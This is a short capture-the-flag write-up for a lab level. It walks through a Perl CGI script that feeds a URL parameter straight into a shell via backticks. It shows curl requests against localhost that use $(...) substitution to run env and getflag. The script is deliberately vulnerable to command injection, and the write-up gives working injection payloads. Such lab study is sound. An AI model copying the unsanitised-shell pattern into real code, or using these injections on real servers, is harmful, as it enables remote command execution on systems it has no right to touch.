with `ls -la` we find a `level04.pl` with writed by the user `flag04`

```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

this is a basic CGI in perl
first it prints "Content-type: text/html\n\n", it is to tell the browser that the response will be of type text/HTML
then it defines a subroutine `x` that takes one arg and assigns it to `$y`
then it prints the content of `$y` with echo and do a `2>&1` to redirect the stderr to stdout
then it calls this subroutine `x` with the value of `x` (a param from CGI)

this is bad because it execute it directly on the host, so we can chain command like `?x=hello;env` to get what we want
sadly this is not working, if we do:
curl "http://localhost:4747/level04.pl?x=hello;/usr/bin/env"
we just get `hello`
but we can still use this, we just need to put everything in one command, and make echo print the result:
curl "http://localhost:4747/level04.pl?x=\$(/usr/bin/env)"
this is working and `/usr/bin/env` get executed, we just need to do the same with `getflag`
curl "http://localhost:4747/level04.pl?x=\$(getflag)"